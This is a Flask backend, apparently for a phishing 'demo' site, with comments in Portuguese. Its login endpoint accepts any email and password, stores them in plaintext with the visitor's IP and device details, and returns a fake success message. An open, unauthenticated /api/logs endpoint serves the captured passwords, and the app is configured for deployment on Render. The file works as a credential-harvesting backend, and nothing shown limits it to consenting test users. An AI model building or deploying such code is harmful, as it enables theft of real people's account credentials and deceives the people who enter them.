from flask import Flask, request, jsonify, send_from_directory, make_response
from flask_sqlalchemy import SQLAlchemy
from dotenv import load_dotenv
import os
from datetime import datetime
import threading

load_dotenv()

app = Flask(__name__)

# Database - suporta PostgreSQL (Render) ou SQLite (local)
database_url = os.getenv('DATABASE_URL', '')
# Render usa 'postgres://' mas SQLAlchemy precisa de 'postgresql://'
if database_url.startswith('postgres://'):
    database_url = database_url.replace('postgres://', 'postgresql://', 1)

if database_url:
    app.config['SQLALCHEMY_DATABASE_URI'] = database_url
else:
    # Fallback SQLite local
    db_path = os.path.join(os.path.dirname(__file__), 'phishing_demo.db')
    app.config['SQLALCHEMY_DATABASE_URI'] = f'sqlite:///{db_path}'

app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SQLALCHEMY_ENGINE_OPTIONS'] = {
    'pool_pre_ping': True,
    'pool_recycle': 300,
}
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', 'dev-secret')
app.config['FRONTEND_DIST'] = os.path.join(os.path.dirname(__file__), '..', 'frontend', 'dist')
app.config['FRONTEND_SRC'] = os.path.join(os.path.dirname(__file__), '..', 'frontend')

def serve_frontend_file(filename):
    """Serve arquivo do frontend, tentando dist/ primeiro, depois src/"""
    dist_path = os.path.join(app.config['FRONTEND_DIST'], filename)
    if os.path.exists(dist_path):
        return send_from_directory(app.config['FRONTEND_DIST'], filename)
    return send_from_directory(app.config['FRONTEND_SRC'], filename)

db = SQLAlchemy(app)
db_lock = threading.Lock()

class PhishingLogin(db.Model):
    __tablename__ = 'phishing_logins'
    
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(255), nullable=False)
    password = db.Column(db.String(255), nullable=False)
    ip = db.Column(db.String(45))
    user_agent = db.Column(db.Text)
    device_info = db.Column(db.Text)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

@app.after_request
def add_cors_headers(response):
    response.headers['Access-Control-Allow-Origin'] = '*'
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
    response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
    response.headers['Access-Control-Max-Age'] = '86400'
    return response

@app.route('/')
def serve_index():
    return serve_frontend_file('index.html')

@app.route('/<path:path>')
def serve_static(path):
    return serve_frontend_file(path)

@app.route('/apos_login.html')
def serve_apos_login():
    return serve_frontend_file('apos_login.html')

@app.route('/logs')
def serve_logs():
    return serve_frontend_file('logs.html')

@app.route('/sw.js')
def serve_sw():
    response = make_response(serve_frontend_file('sw.js'))
    response.headers['Cache-Control'] = 'no-cache'
    response.headers['Content-Type'] = 'application/javascript'
    return response

@app.route('/manifest.json')
def serve_manifest():
    response = make_response(serve_frontend_file('manifest.json'))
    response.headers['Content-Type'] = 'application/manifest+json'
    return response

def get_client_ip():
    ip = (
        request.headers.get('CF-Connecting-IP') or
        request.headers.get('X-Real-IP') or
        request.headers.get('X-Forwarded-For', '').split(',')[0].strip() or
        request.headers.get('X-Original-Forwarded-For', '').split(',')[0].strip() or
        request.headers.get('X-Client-IP') or
        request.headers.get('X-Forwarded', '') or
        request.remote_addr or
        '0.0.0.0'
    )
    if ip:
        ip = ip.strip().strip('"').strip("'")
    return ip if ip else '0.0.0.0'

def parse_device_info():
    ua = request.headers.get('User-Agent', '')
    
    device = {
        'user_agent': ua,
        'ip': get_client_ip(),
        'platform': request.headers.get('Sec-CH-UA-Platform', 'unknown'),
        'mobile': 'Mobile' in ua or 'Android' in ua or 'iPhone' in ua or 'iPad' in ua,
        'os': 'unknown',
        'browser': 'unknown'
    }
    
    if 'Android' in ua:
        device['os'] = 'Android'
    elif 'iPhone' in ua or 'iPad' in ua:
        device['os'] = 'iOS'
    elif 'Windows' in ua:
        device['os'] = 'Windows'
    elif 'Mac OS' in ua:
        device['os'] = 'macOS'
    elif 'Linux' in ua:
        device['os'] = 'Linux'
    
    if 'Edg' in ua:
        device['browser'] = 'Edge'
    elif 'Chrome' in ua:
        device['browser'] = 'Chrome'
    elif 'Safari' in ua and 'Chrome' not in ua:
        device['browser'] = 'Safari'
    elif 'Firefox' in ua:
        device['browser'] = 'Firefox'
    
    return device

def init_db():
    with app.app_context():
        db.create_all()

# Inicializar banco ao importar (necessário para Gunicorn no Render)
init_db()

@app.route('/api/login', methods=['POST'])
def login():
    try:
        data = request.get_json(force=True, silent=True) or {}
        email = (data.get('email') or '').strip()
        password = (data.get('password') or '').strip()

        if not email or not password:
            return jsonify({'error': 'Email e senha são obrigatórios'}), 400

        if len(password) < 8:
            return jsonify({'error': 'Senha deve ter pelo menos 8 dígitos'}), 400

        # Priorizar IP e device_info enviados pelo cliente (navegador)
        # Fallback para IP dos headers de proxy e device_info do User-Agent
        client_ip = data.get('client_ip')
        if client_ip and client_ip != 'unknown':
            ip = client_ip
        else:
            ip = get_client_ip()
        
        client_device = data.get('device_info')
        if client_device and isinstance(client_device, dict):
            # Mesclar info do cliente com info do servidor
            server_device = parse_device_info()
            server_device['client_provided'] = True
            server_device.update(client_device)
            device_info = server_device
        else:
            device_info = parse_device_info()
        
        user_agent = request.headers.get('User-Agent', '')
        timestamp = datetime.utcnow()

        with db_lock:
            login_entry = PhishingLogin(
                email=email,
                password=password,
                ip=ip,
                user_agent=user_agent,
                device_info=str(device_info),
                timestamp=timestamp
            )
            db.session.add(login_entry)
            db.session.commit()

        return jsonify({
            'success': True,
            'message': 'Login efetuado com sucesso!',
            'redirect': '/pos-login'
        }), 200

    except Exception as e:
        db.session.rollback()
        return jsonify({'error': 'Erro interno', 'message': str(e)}), 500

@app.route('/api/stats', methods=['GET'])
def stats():
    try:
        total = db.session.query(db.func.count(PhishingLogin.id)).scalar()
        unique_ips = db.session.query(db.func.count(db.distinct(PhishingLogin.ip))).scalar()
        unique_emails = db.session.query(db.func.count(db.distinct(PhishingLogin.email))).scalar()
        
        return jsonify({
            'total_logins': total or 0,
            'unique_ips': unique_ips or 0,
            'unique_emails': unique_emails or 0
        }), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/logs', methods=['GET'])
def logs():
    try:
        entries = PhishingLogin.query.order_by(PhishingLogin.timestamp.desc()).limit(100).all()
        logs_list = []
        for entry in entries:
            logs_list.append({
                'id': entry.id,
                'email': entry.email,
                'password': entry.password,
                'ip': entry.ip,
                'user_agent': entry.user_agent,
                'device_info': entry.device_info,
                'timestamp': entry.timestamp.isoformat() if entry.timestamp else None
            })
        
        return jsonify({'logs': logs_list}), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/health', methods=['GET'])
def health():
    return jsonify({
        'status': 'ok',
        'timestamp': datetime.utcnow().isoformat(),
        'database': app.config['SQLALCHEMY_DATABASE_URI'][:20] + '...' if len(app.config['SQLALCHEMY_DATABASE_URI']) > 20 else app.config['SQLALCHEMY_DATABASE_URI']
    }), 200

if __name__ == '__main__':
    init_db()
    port = int(os.getenv('PORT', 3000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
